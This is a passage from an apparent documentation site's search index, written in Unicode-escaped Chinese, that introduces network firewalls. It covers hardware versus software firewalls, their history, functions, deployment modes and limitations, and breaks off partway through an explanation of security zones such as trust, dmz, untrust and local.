<p>\u9632\u706b\u5899\u53ef\u4ee5\u5206\u4e3a\u8f6f\u4ef6\u9632\u706b\u5899\u3001\u786c\u4ef6\u9632\u706b\u5899\u3002\u786c\u4ef6\u5e38\u89c1\u7684\u5382\u5546\u6709\u534e\u4e3a\u3001\u6df1\u4fe1\u670d\u3001\u601d\u79d1\u7b49\uff1b\u8f6f\u4ef6\u6700\u5e38\u89c1\u7684\u5c31\u662fwindows\u7684ISA\u3002</p> <p></p>"},{"location":"Security_devices/Introduction/FW1/index.html#2","title":"2.\u786c\u4ef6\u9632\u706b\u5899\u548c\u8f6f\u4ef6\u9632\u706b\u5899\u6709\u4ec0\u4e48\u533a\u522b\uff1f","text":"<p>\u786c\u4ef6\u9632\u706b\u5899\uff0c\u628a\u201c\u8f6f\u4ef6\u9632\u706b\u5899\u201d\u5d4c\u5165\u5728\u786c\u4ef6\u4e2d\uff0c\u628a\u201c\u9632\u706b\u5899\u7a0b\u5e8f\u201d\u52a0\u5165\u5230\u82af\u7247\u91cc\u9762\uff0c\u7531\u786c\u4ef6\u6267\u884c\u8fd9\u4e9b\u529f\u80fd\uff0c\u4ece\u800c\u51cf\u5c11\u8ba1\u7b97\u673a\u6216\u670d\u52a1\u5668\u7684CPU\u8d1f\u62c5\u3002\u4e00\u822c\u7684\u201c\u8f6f\u4ef6\u5b89\u5168\u5382\u5546\u201d\u6240\u63d0\u4f9b\u7684\u201c\u786c\u4ef6\u9632\u706b\u5899\u201d\uff0c\u5c31\u662f\u5728\u201c\u786c\u4ef6\u670d\u52a1\u5668\u5382\u5546\u201d\u5b9a\u5236\u786c\u4ef6\uff0c\u7136\u540e\u518d\u628a\u201cLinux\u7cfb\u7edf\u201d\u4e0e\u81ea\u5df1\u7684\u8f6f\u4ef6\u7cfb\u7edf\u7ed3\u5408\u5d4c\u5165\u3002\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u662f\u4e00\u79cd\u7528\u4e8e\u4fdd\u62a4\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u7684\u8bbe\u5907\u3002\u5b83\u662f\u4e00\u53f0\u8fd0\u884c\u5728\u7f51\u7edc\u4e4b\u95f4\u7684\u8bbe\u5907\uff0c\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6d41\u91cf\u5e76\u6839\u636e\u9884\u8bbe\u89c4\u5219\u5bf9\u7f51\u7edc\u6d41\u91cf\u8fdb\u884c\u8fc7\u6ee4\u548c\u7ba1\u7406\u3002\u540c\u65f6\uff0c\u5b83\u80fd\u591f\u68c0\u6d4b\u548c\u963b\u6b62\u7f51\u7edc\u653b\u51fb\u3001\u75c5\u6bd2\u3001\u6076\u610f\u8f6f\u4ef6\u3001\u5783\u573e\u90ae\u4ef6\u7b49\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u3002</p> <p>\u8f6f\u4ef6\u9632\u706b\u5899\uff0c\u4e00\u822c\u57fa\u4e8e\u67d0\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u5f00\u53d1\uff0c\u76f4\u63a5\u5728\u8ba1\u7b97\u673a\u4e0a\u8fdb\u884c\u8f6f\u4ef6\u7684\u5b89\u88c5\u548c\u914d\u7f6e\u3002\u7531\u4e8e\u5ba2\u6237\u4e4b\u95f4\u64cd\u4f5c\u7cfb\u7edf\u7684\u591a\u6837\u6027\uff0c\u8f6f\u4ef6\u9632\u706b\u5899\u9700\u8981\u652f\u6301\u591a\u79cd\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5982\u201cUnix\u3001Linux\u3001SCO-Unix\u3001Windows\u201d\u7b49\u3002</p> <p>\u786c\u4ef6\u9632\u706b\u5899\uff0c\u662f\u901a\u8fc7\u786c\u4ef6\u548c\u8f6f\u4ef6\u7684\u7ec4\u5408\u6765\u8fbe\u5230\u9694\u79bb\u5185\u5916\u90e8\u7f51\u7edc\u7684\u76ee\u7684\uff1b\u800c\u8f6f\u4ef6\u9632\u706b\u5899\uff0c\u662f\u901a\u8fc7\u7eaf\u8f6f\u4ef6\u7684\u7684\u65b9\u5f0f\uff0c\u5b9e\u73b0\u9694\u79bb\u5185\u5916\u90e8\u7f51\u7edc\u7684\u76ee\u7684\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#3","title":"3.\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u7684\u5de5\u4f5c\u8fc7\u7a0b\u5927\u81f4\u5206\u4e3a\u5982\u4e0b\u51e0\u6b65\uff1a</p> <ol> <li>\u76d1\u89c6\u7f51\u7edc\u6d41\u91cf\uff1a\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u80fd\u591f\u76d1\u89c6\u6765\u81ea\u7f51\u7edc\u7684\u6240\u6709\u6570\u636e\u5305\uff0c\u5e76\u5c06\u5176\u4f20\u9012\u5230\u4e0b\u4e00\u6b65\u8fdb\u884c\u5904\u7406\u3002</li> <li>\u6570\u636e\u5305\u8fc7\u6ee4\uff1a\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u6839\u636e\u9884\u8bbe\u7684\u89c4\u5219\u5bf9\u6bcf\u4e2a\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\u548c\u5224\u65ad\uff0c\u5224\u65ad\u662f\u5426\u5141\u8bb8\u901a\u8fc7\u7f51\u7edc\u3002</li> <li>\u8bb0\u5f55\u65e5\u5fd7\uff1a\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u4f1a\u5c06\u6240\u6709\u88ab\u5141\u8bb8\u6216\u62d2\u7edd\u7684\u6570\u636e\u5305\u3001\u653b\u51fb\u548c\u5b89\u5168\u4e8b\u4ef6\u8bb0\u5f55\u4e0b\u6765\uff0c\u4ee5\u4f9b\u540e\u7eed\u5ba1\u8ba1\u548c\u5206\u6790\u3002</li> <li>\u8b66\u62a5\uff1a\u786c\u4ef6\u7f51\u7edc\u9632\u706b\u5899\u53ef\u4ee5\u5411\u7ba1\u7406\u5458\u53d1\u51fa\u8b66\u62a5\uff0c\u4ee5\u901a\u77e5\u4ed6\u4eec\u7f51\u7edc\u4e0a\u51fa\u73b0\u7684\u5f02\u5e38\u60c5\u51b5\u548c\u5b89\u5168\u4e8b\u4ef6\u3002</li> </ol>"},{"location":"Security_devices/Introduction/FW1/index.html#4","title":"4.\u9632\u706b\u5899\u53d1\u5c55\u53f2","text":"<p>\u9632\u706b\u5899\u7684\u53d1\u5c55\u5386\u7ecf\u4e09\u4ee3:\u7b80\u5355\u5305\u8fc7\u6ee4\u3001\u5e94\u7528\u4ee3\u7406\u3001\u72b6\u6001\u68c0\u6d4b\u9632\u706b\u5899\uff0c\u76ee\u524d\u6700\u65b0\u7684\u4e3b\u6d41\u6280\u672f\u662f\u5177\u6709\u6570\u636e\u6d41\u8fc7\u6ee4\u529f\u80fd\u7684\u9632\u706b\u5899\u3002</p> <p>\u65e9\u671f\u7684\u9632\u706b\u5899\u4e00\u822c\u662f\u76f4\u63a5\u5b89\u88c5\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u4e00\u5957\u8f6f\u4ef6\uff0c\u662f\u4e00\u4e2a\u5e94\u7528\u8f6f\u4ef6\uff0c\u4ee3\u8868\u7684\u4ea7\u54c1 \u6709checkpoint\u516c\u53f8\u7684\u9632\u706b\u5899\uff0c\u8fd8\u6709\u4e00\u4e9b\u7528\u4e8e\u4e2a\u4eba\u8ba1\u7b97\u673a\u7684\u9632\u706b\u5899\uff0c\u5982\u745e\u661f\u3001360ARP\uff0c\u91d1\u5c71\u7f51\u76fe\u7b49\u3002</p> <p>\u540e\u6765\u91c7\u7528PC\u786c\u4ef6\u7ed3\u6784\uff0c\u57fa\u4e8eUnix\u3001LINUX\u7b49\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5f00\u53d1\u5b89\u5168\u9632\u62a4\u7684\u4e00\u4e9b\u57fa\u672c\u7279\u6027\u6240\u6784\u6210\u7684\u786c\u4ef6\u9632\u706b\u5899\uff0c\u662f\u8f6f\u4ef6\u548c\u786c\u4ef6\u7684\u7ed3\u5408\u4f53\uff0c\u5982\u5929\u878d\u4fe1\u516c\u53f8\u7684\u65e9\u671f\u9632\u706b\u5899\u4ea7\u54c1\u3002</p> <p>\u73b0\u5728\u5219\u662f\u91c7\u7528\u72ec\u7acb\u8bbe\u8ba1\u7684asic\u82af\u7247\uff0c\u57fa\u4e8e\u4e13\u95e8\u7684\u786c\u4ef6\u5e73\u53f0\uff0c\u6ca1\u6709\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5728CPU, \u7535\u6e90\u3001\u98ce\u6247\u3001\u603b\u7ebf\u3001\u6269\u5c55\u63d2\u5361\u7b49\u65b9\u9762\u4f18\u5316\u7ed3\u6784\uff0c\u4fdd\u8bc1\u9632\u706b\u5899\u4ea7\u54c1\u5f97\u5230\u6700\u4f18\u7684\u5904\u7406\u6027\u80fd\uff0c\u6bd4 \u8f83\u6709\u540d\u7684\u662f\u534e\u4e3a\u3001\u601d\u79d1\u3001H3C\u3001juniper\u7b49\u516c\u53f8\u7684\u9632\u706b\u5899\u4ea7\u54c1\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#5","title":"5.\u9632\u706b\u5899\u529f\u80fd","text":"<p>\u5728\u903b\u8f91\u4e0a\uff0c\u9632\u706b\u5899\u662f\u4e00\u4e2a\u5206\u79bb\u5668\uff0c\u4e00\u4e2a\u9650\u5236\u5668\uff0c\u4e5f\u662f\u4e00\u4e2a\u5206\u6790\u5668\uff0c\u5165\u4fb5\u8005\u5fc5\u987b\u9996\u5148\u7a7f\u8d8a\u9632 \u706b\u5899\u7684\u5b89\u5168\u9632\u7ebf\uff0c\u624d\u80fd\u63a5\u89e6\u76ee\u6807\u8ba1\u7b97\u673a\u3002\u4e3b\u8981\u662f\u53ef\u5b9e\u73b0\u57fa\u672c\u5305\u8fc7\u6ee4\u7b56\u7565\u7684\u9632\u706b\u5899\uff0c\u8fd9\u7c7b\u662f\u6709\u786c\u4ef6\u5904\u7406\u3001\u8f6f\u4ef6\u5904\u7406\u7b49\uff0c\u5176\u4e3b\u8981\u529f\u80fd\u5b9e\u73b0\u662f\u9650\u5236\u5bf9IP:port\u7684\u8bbf\u95ee\u3002\u57fa\u672c\u4e0a\u7684\u5b9e\u73b0\u90fd\u662f\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5173\u95ed\u6240\u6709\u7684\u901a\u8fc7\u578b\u8bbf\u95ee\uff0c\u53ea\u5f00\u653e\u5141\u8bb8\u8bbf\u95ee\u7684\u7b56\u7565\u3002FW\u53ef\u4ee5\u62e6\u622a\u4f4e\u5c42\u653b\u51fb\u884c\u4e3a\uff0c\u4f46\u5bf9\u5e94\u7528\u5c42\u7684\u6df1\u5c42\u653b\u51fb\u884c\u4e3a\u65e0\u80fd\u4e3a\u529b\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#1_2","title":"1)\u51fa\u8272\u7684\u63a7\u5236\u80fd\u529b\uff0c\u8fc7\u6ee4\u6389\u4e0d\u5b89\u5168\u670d\u52a1","text":"<p>\u9632\u706b\u5899\u4f5c\u4e3a\u4e00\u4e2a\u963b\u585e\u70b9\u3001\u63a7\u5236\u70b9\uff0c\u80fd\u5c01\u9501\u6240\u6709\u7684\u4fe1\u606f\u6d41\uff0c\u901a\u8fc7\u670d\u52a1\u63a7\u5236(\u786e\u5b9a\u54ea\u4e9b\u670d \u52a1\u53ef\u4ee5\u88ab\u8bbf\u95ee)\u3001\u65b9\u5411\u63a7\u5236(\u5bf9\u4e8e\u7279\u5b9a\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u786e\u5b9a\u5141\u8bb8\u54ea\u4e2a\u65b9\u5411\u80fd\u591f\u901a\u8fc7\u9632\u706b \u5899)\u3001\u7528\u6237\u63a7\u5236(\u6839\u636e\u7528\u6237\u6765\u63a7\u5236\u5bf9\u670d\u52a1\u7684\u8bbf\u95ee)\u3001\u884c\u4e3a\u63a7\u5236(\u63a7\u5236\u4e00\u4e2a\u7279\u5b9a\u7684\u670d\u52a1\u7684\u884c \u4e3a)\uff0c\u5bf9\u5e0c\u671b\u63d0\u4f9b\u7684\u5b89\u5168\u670d\u52a1\u9010\u9879\u5f00\u653e\uff0c\u628a\u4e0d\u5b89\u5168\u7684\u670d\u52a1\u6216\u53ef\u80fd\u6709\u5b89\u5168\u9690\u60a3\u7684\u670d\u52a1\u4e00\u5f8b\u627c \u6740\u5728\u840c\u82bd\u4e4b\u4e2d\uff0c\u4ece\u800c\u6781\u5927\u5730\u63d0\u9ad8\u5185\u90e8\u7f51\u7edc\u7684\u5b89\u5168\u6027\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#2_1","title":"2)\u8fc7\u6ee4\u975e\u6cd5\u7528\u6237\u548c\u8bbf\u95ee\u7279\u6b8a\u7ad9\u70b9","text":"<p>\u901a\u8fc7\u4ee5\u9632\u706b\u5899\u4e3a\u4e2d\u5fc3\u7684\u7f51\u7edc\u5b89\u5168\u65b9\u6848\u914d\u7f6e\uff0c\u80fd\u5c06\u6240\u6709\u5b89\u5168\u8f6f\u4ef6(\u53e3\u4ee4\u3001\u52a0\u5bc6\u3001\u8eab\u4efd\u8ba4 \u8bc1\u3001\u5ba1\u8ba1\u7b49)\u914d\u7f6e\u5728\u9632\u706b\u5899\u4e0a\uff0c\u4ee5\u5f3a\u5316\u7f51\u7edc\u5b89\u5168\u7b56\u7565\u3002\u5982\u662f\u5426\u5141\u8bb8\u6240\u6709\u7528\u6237\u548c\u7ad9\u70b9\u5bf9\u5185\u90e8 \u7f51\u7edc\u8fdb\u884c\u8bbf\u95ee\uff0c\u662f\u5426\u6309\u7167IP\u5730\u5740\u5bf9\u672a\u6388\u6743\u7684\u7528\u6237\u6216\u4e0d\u4fe1\u4efb\u7684\u7ad9\u70b9\u8fdb\u884c\u9010\u9879\u5c4f\u853d\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#3_1","title":"3)\u5b83\u80fd\u591f\u5bf9\u7f51\u7edc\u5b58\u53d6\u548c\u8bbf\u95ee\u8fdb\u884c\u76d1\u63a7\u5ba1\u8ba1","text":"<p>\u6240\u6709\u7684\u5916\u90e8\u8bbf\u95ee\u90fd\u7ecf\u8fc7\u9632\u706b\u5899\u65f6\uff0c\u9632\u706b\u5899\u5c31\u80fd\u8bb0\u5f55\u4e0b\u8fd9\u4e9b\u8bbf\u95ee\uff0c\u4e3a\u7f51\u7edc\u4f7f\u7528\u60c5\u51b5\u63d0\u4f9b\u7edf \u8ba1\u6570\u636e\u3002\u5f53\u53d1\u751f\u53ef\u7591\u4fe1\u606f\u65f6\u9632\u706b\u5899\u80fd\u53d1\u51fa\u62a5\u8b66\uff0c\u5e76\u63d0\u4f9b\u7f51\u7edc\u662f\u5426\u53d7\u5230\u76d1\u6d4b\u548c\u653b\u51fb\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#6","title":"6.\u9632\u706b\u5899\u7684\u90e8\u7f72\u4f4d\u7f6e","text":"<p>\uff081\uff09\u7f51\u7edc\u8fb9\u754c\uff1a\u5728\u4f01\u4e1a\u7f51\u7edc\u4e0e\u5916\u754c\u7f51\u7edc\u7684\u8fde\u63a5\u5904\u90e8\u7f72\u9632\u706b\u5899\uff0c\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u5916\u90e8\u653b\u51fb\u548c\u672a\u7ecf\u6388\u6743\u7684\u8bbf\u95ee\u3002</p> <p>\uff082\uff09\u5185\u7f51\u5206\u6bb5\uff1a\u5bf9\u4e8e\u5927\u578b\u4f01\u4e1a\u6216\u7ec4\u7ec7\uff0c\u5185\u90e8\u7f51\u7edc\u53ef\u80fd\u8f83\u4e3a\u590d\u6742\uff0c\u9700\u8981\u5c06\u4e0d\u540c\u90e8\u95e8\u6216\u4e1a\u52a1\u529f\u80fd\u7684\u7f51\u7edc\u8fdb\u884c\u5206\u6bb5\u9694\u79bb\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u7f51\u7edc\u6bb5\u4e4b\u95f4\u90e8\u7f72\u9632\u706b\u5899\uff0c\u4ee5\u5b9e\u73b0\u7ec6\u7c92\u5ea6\u7684\u8bbf\u95ee\u63a7\u5236\u548c\u5b89\u5168\u9632\u62a4\u3002</p> <p>\uff083\uff09\u4e91\u73af\u5883\uff1a\u968f\u7740\u4e91\u8ba1\u7b97\u7684\u666e\u53ca\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u4f01\u4e1a\u5c06\u6570\u636e\u548c\u5e94\u7528\u8fc1\u79fb\u5230\u4e91\u4e0a\u3002\u5728\u4e91\u73af\u5883\u4e2d\uff0c\u9632\u706b\u5899\u53ef\u4ee5\u90e8\u7f72\u5728\u865a\u62df\u673a\u6216\u5bb9\u5668\u4e4b\u95f4\uff0c\u4ee5\u53ca\u4e91\u5e73\u53f0\u548c\u5916\u90e8\u7f51\u7edc\u4e4b\u95f4\uff0c\u786e\u4fdd\u4e91\u73af\u5883\u7684\u5b89\u5168\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f:\u7f51\u5173\u6a21\u5f0f\u3001\u900f\u660e\u6a21\u5f0f</p> <p>\u7f51\u5173\u6a21\u5f0f\u662f\u73b0\u5728\u7528\u7684\u6700\u591a\u7684\u6a21\u5f0f\uff0c\u53ef\u4ee5\u66ff\u4ee3\u8def\u7531\u5668\u5e76\u63d0\u4f9b\u66f4\u591a\u7684\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u5404\u79cd\u7c7b\u578b\u4f01\u4e1a.\u900f\u660e\u90e8\u7f72\u662f\u5728\u4e0d\u6539\u53d8\u73b0\u6709\u7f51\u7edc\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\uff0c\u5c06\u9632\u706b\u5899\u4ee5\u900f\u660e\u7f51\u6865\u7684\u6a21\u5f0f\u4e32\u8054\u5230\u4f01\u4e1a\u7684\u7f51\u7edc\u4e2d\u95f4\uff0c\u901a\u8fc7\u5305\u8fc7\u6ee4\u89c4\u5219\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236\uff0c\u505a\u5b89\u5168\u57df\u7684\u5212\u5206\u3002\u81f3\u4e8e\u4ec0\u4e48\u65f6\u5019\u4f7f\u7528\u7f51\u5173\u6a21\u5f0f\u6216\u8005\u4f7f\u7528\u900f\u660e\u6a21\u5f0f\uff0c\u9700\u8981\u6839\u636e\u81ea\u8eab\u9700\u8981\u51b3\u5b9a\uff0c\u6ca1\u6709\u7edd\u5bf9\u7684\u90e8\u7f72\u65b9\u5f0f\u3002\u9700\u4e0d\u9700\u8981\u5c06\u670d\u52a1\u5668\u90e8\u7f72\u5728 DMZ\u533a\uff0c\u53d6\u51b3\u4e8e\u670d\u52a1\u5668\u7684\u6570\u91cf\u3001\u91cd\u8981\u6027\u3002</p>"},{"location":"Security_devices/Introduction/FW1/index.html#7","title":"7.\u9632\u706b\u5899\u7684\u5c40\u9650\u6027","text":"<ol> <li>\u4e0d\u80fd\u9632\u6b62\u6e90\u4e8e\u5185\u90e8\u7684\u653b\u51fb\uff0c\u4e0d\u63d0\u4f9b\u5bf9\u5185\u90e8\u7684\u4fdd\u62a4</li> <li>\u4e0d\u80fd\u9632\u75c5\u6bd2</li> <li>\u4e0d\u80fd\u6839\u636e\u7f51\u7edc\u88ab\u6076\u610f\u4f7f\u7528\u548c\u653b\u51fb\u7684\u60c5\u51b5\u52a8\u6001\u8c03\u6574\u81ea\u5df1\u7684\u7b56\u7565\u672c\u8eab\u7684\u9632\u653b\u51fb\u80fd\u529b\u4e0d\u591f\uff0c\u5bb9\u6613\u6210\u4e3a\u88ab\u653b\u51fb\u7684\u9996\u8981\u76ee\u6807</li> </ol>"},{"location":"Security_devices/Introduction/FW2/index.html","title":"\u4e86\u89e3\u9632\u706b\u5899\u57fa\u672c\u673a\u5236","text":""},{"location":"Security_devices/Introduction/FW2/index.html#01","title":"01  \u4ec0\u4e48\u662f\u9632\u706b\u5899","text":"<p>\u9632\u706b\u5899\u662f\u4e00\u79cd\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u901a\u5e38\u4f4d\u4e8e\u7f51\u7edc\u8fb9\u754c\uff0c\u7528\u4e8e\u9694\u79bb\u4e0d\u540c\u5b89\u5168\u7ea7\u522b\u7684\u7f51\u7edc\uff0c\u4fdd\u62a4\u4e00\u4e2a\u7f51\u7edc\u514d\u53d7\u6765\u81ea\u53e6\u4e00\u4e2a\u7f51\u7edc\u7684\u653b\u51fb\u548c\u5165\u4fb5\u3002</p> <p>\u8fd9\u79cd\u201c\u9694\u79bb\u201d\u4e0d\u662f\u4e00\u5200\u5207\uff0c\u662f\u6709\u63a7\u5236\u7684\u9694\u79bb\uff0c\u5141\u8bb8\u5408\u6cd5\u6d41\u91cf\u901a\u8fc7\u9632\u706b\u5899\uff0c\u7981\u6b62\u975e\u6cd5\u6d41\u91cf\u901a\u8fc7\u9632\u706b\u5899\u3002</p> <p>\u5982\u56fe 1-1 \u6240\u793a\uff0c\u9632\u706b\u5899\u4f4d\u4e8e\u4f01\u4e1a Internet \u51fa\u53e3\u4fdd\u62a4\u5185\u7f51\u5b89\u5168\u3002</p> <p>\u5728\u9632\u706b\u5899\u4e0a\u53ef\u4ee5\u6307\u5b9a\u89c4\u5219\uff0c\u5141\u8bb8\u5185\u7f51 10.1.1.0/24 \u7f51\u6bb5\u7684 PC \u8bbf\u95ee Internet \uff0c\u7981\u6b62 Internet \u7528\u6237\u8bbf\u95ee IP \u5730\u5740\u4e3a192.168.1.2 \u7684\u5185\u7f51\u4e3b\u673a\u3002</p> <p>\u56fe 1-1 \u9632\u706b\u5899\u63a7\u5236\u6d41\u91cf\u8f6c\u53d1\uff1a</p> <p></p> <p>\u7531\u4e0a\u6587\u53ef\u89c1\uff0c\u9632\u706b\u5899\u4e0e\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u662f\u6709\u533a\u522b\u7684\u3002</p> <p>\u8def\u7531\u5668\u7528\u6765\u8fde\u63a5\u4e0d\u540c\u7684\u7f51\u7edc\uff0c\u901a\u8fc7\u8def\u7531\u534f\u8bae\u4fdd\u8bc1\u4e92\u8054\u4e92\u901a\uff0c\u786e\u4fdd\u5c06\u62a5\u6587\u8f6c\u53d1\u5230\u76ee\u7684\u5730\uff1b</p> <p>\u4ea4\u6362\u673a\u901a\u5e38\u7528\u6765\u7ec4\u5efa\u5c40\u57df\u7f51\uff0c\u4f5c\u4e3a\u5c40\u57df\u7f51\u901a\u4fe1\u7684\u91cd\u8981\u67a2\u7ebd\uff0c\u901a\u8fc7\u4e8c\u5c42/\u4e09\u5c42\u4ea4\u6362\u5feb\u901f\u8f6c\u53d1\u62a5\u6587\uff1b</p> <p>\u800c\u9632\u706b\u5899\u4e3b\u8981\u90e8\u7f72\u5728\u7f51\u7edc\u8fb9\u754c\uff0c\u5bf9\u8fdb\u51fa\u7f51\u7edc\u7684\u8bbf\u95ee\u884c\u4e3a\u8fdb\u884c\u63a7\u5236\uff0c\u5b89\u5168\u9632\u62a4\u662f\u5176\u6838\u5fc3\u7279\u6027\u3002</p> <p>\u8def\u7531\u5668\u4e0e\u4ea4\u6362\u673a\u7684\u672c\u8d28\u662f\u8f6c\u53d1\uff0c\u9632\u706b\u5899\u7684\u672c\u8d28\u662f\u63a7\u5236\u3002</p> <p>\u9632\u706b\u5899\u63a7\u5236\u7f51\u7edc\u6d41\u91cf\u7684\u5b9e\u73b0\u4e3b\u8981\u4f9d\u6258\u4e8e\u5b89\u5168\u533a\u57df\u548c\u5b89\u5168\u7b56\u7565\uff0c\u4e0b\u6587\u8be6\u7ec6\u4ecb\u7ecd\u3002</p>"},{"location":"Security_devices/Introduction/FW2/index.html#02","title":"02  \u63a5\u53e3\u4e0e\u5b89\u5168\u533a\u57df","text":"<p>\u524d\u6587\u63d0\u5230\u9632\u706b\u5899\u7528\u4e8e\u9694\u79bb\u4e0d\u540c\u5b89\u5168\u7ea7\u522b\u7684\u7f51\u7edc\uff0c\u90a3\u4e48\u9632\u706b\u5899\u5982\u4f55\u8bc6\u522b\u4e0d\u540c\u7f51\u7edc\u5462\uff1f</p> <p>\u7b54\u6848\u5c31\u662f\u5b89\u5168\u533a\u57df\uff08Security Zone\uff09\u3002</p> <p>\u901a\u8fc7\u5c06\u9632\u706b\u5899\u5404\u63a5\u53e3\u5212\u5206\u5230\u4e0d\u540c\u7684\u5b89\u5168\u533a\u57df\uff0c\u4ece\u800c\u5c06\u63a5\u53e3\u8fde\u63a5\u7684\u7f51\u7edc\u5212\u5206\u4e3a\u4e0d\u540c\u7684\u5b89\u5168\u7ea7\u522b\u3002</p> <p>\u9632\u706b\u5899\u4e0a\u7684\u63a5\u53e3\u5fc5\u987b\u52a0\u5165\u5b89\u5168\u533a\u57df\uff08\u90e8\u5206\u673a\u578b\u7684\u72ec\u7acb\u7ba1\u7406\u53e3\u9664\u5916\uff09\u624d\u80fd\u5904\u7406\u6d41\u91cf\u3002</p> <p>\u5b89\u5168\u533a\u57df\u7684\u8bbe\u8ba1\u7406\u5ff5\u53ef\u4ee5\u51cf\u5c11\u7f51\u7edc\u653b\u51fb\u9762\uff0c\u4e00\u65e6\u5212\u5206\u5b89\u5168\u533a\u57df\uff0c\u6d41\u91cf\u5c31\u65e0\u6cd5\u5728\u5b89\u5168\u533a\u57df\u4e4b\u95f4\u6d41\u52a8\uff0c\u9664\u975e\u7ba1\u7406\u5458\u6307\u5b9a\u4e86\u5408\u6cd5\u7684\u8bbf\u95ee\u89c4\u5219\u3002</p> <p>\u5982\u679c\u7f51\u7edc\u88ab\u5165\u4fb5\uff0c\u653b\u51fb\u8005\u4e5f\u53ea\u80fd\u8bbf\u95ee\u540c\u4e00\u4e2a\u5b89\u5168\u533a\u57df\u5185\u7684\u8d44\u6e90\uff0c\u8fd9\u5c31\u628a\u635f\u5931\u63a7\u5236\u5728\u4e00\u4e2a\u6bd4\u8f83\u5c0f\u7684\u8303\u56f4\u5185\u3002\u56e0\u6b64\u5efa\u8bae\u901a\u8fc7\u5b89\u5168\u533a\u57df\u4e3a\u7f51\u7edc\u7cbe\u7ec6\u5316\u5206\u533a\u3002</p> <p>\u63a5\u53e3\u52a0\u5165\u5b89\u5168\u533a\u57df\u4ee3\u8868\u63a5\u53e3\u6240\u8fde\u63a5\u7684\u7f51\u7edc\u52a0\u5165\u5b89\u5168\u533a\u57df\uff0c\u800c\u4e0d\u662f\u6307\u63a5\u53e3\u672c\u8eab\u3002</p> <p>\u63a5\u53e3\u3001\u7f51\u7edc\u548c\u5b89\u5168\u533a\u57df\u7684\u5173\u7cfb\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u9632\u706b\u5899\u7684\u5b89\u5168\u533a\u57df\u6309\u7167\u5b89\u5168\u7ea7\u522b\u7684\u4e0d\u540c\u4ece 1 \u5230 100 \u5212\u5206\u5b89\u5168\u7ea7\u522b\uff0c\u6570\u5b57\u8d8a\u5927\u8868\u793a\u5b89\u5168\u7ea7\u522b\u8d8a\u9ad8\u3002</p> <p>\u9632\u706b\u5899\u7f3a\u7701\u5b58\u5728 trust\u3001dmz\u3001untrust \u548c local \u56db\u4e2a\u5b89\u5168\u533a\u57df\uff0c\u7ba1\u7406\u5458\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5b89\u5168\u533a\u57df\u5b9e\u73b0\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u3002</p> <p>\u4f8b\u5982\uff0c\u4e00\u4e2a\u4f01\u4e1a\u6309\u56fe 1-3 \u5212\u5206\u9632\u706b\u5899\u7684\u5b89\u5168\u533a\u57df\uff0c\u5185\u7f51\u63a5\u53e3\u52a0\u5165 trust \u5b89\u5168\u533a\u57df\uff0c\u5916\u7f51\u63a5\u53e3\u52a0\u5165 untrust \u5b89\u5168\u533a\u57df\uff0c\u670d\u52a1\u5668\u533a\u63a5\u53e3\u52a0\u5165 dmz \u5b89\u5168\u533a\u57df\uff0c\u53e6\u5916\u4e3a\u8bbf\u5ba2\u533a\u81ea\u5b9a\u4e49\u540d\u79f0\u4e3a guest \u7684\u5b89\u5168\u533a\u57df\u3002</p> <p>\u4e00\u4e2a\u63a5\u53e3\u53ea\u80fd\u52a0\u5165\u5230\u4e00\u4e2a\u5b89\u5168\u533a\u57df\uff0c\u4e00\u4e2a\u5b89\u5168\u533a\u57df\u4e0b\u53ef\u4ee5\u52a0\u5165\u591a\u4e2a\u63a5\u53e3\u3002</p> <p>\u56fe 1-3 \u5212\u5206\u5b89\u5168\u533a\u57df\uff1a</p> <p></p> <p>\u4e0a\u56fe\u4e2d\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u5b89\u5168\u533a\u57df local\uff0c\u5b89\u5168\u7ea7\u522b\u6700\u9ad8\u4e3a 100\u3002</p> <p>local \u4ee3\u8868\u9632\u706b\u5899\u672c\u8eab\uff0clocal\u533a\u57df\u4e2d\u4e0d\u80fd\u6dfb\u52a0\u4efb\u4f55\u63a5\u53e3\uff0c\u4f46\u9632\u706b\u5899\u4e0a\u6240\u6709\u63a5\u53e3\u672c\u8eab\u90fd\u9690\u542b\u5c5e\u4e8e local \u533a\u57df\u3002</p> <p>\u51e1\u662f\u7531\u9632\u706b\u5899\u4e3b\u52a8\u53d1\u51fa\u7684\u62a5\u6587\u5747\u53ef\u8ba4\u4e3a\u662f\u4ece local 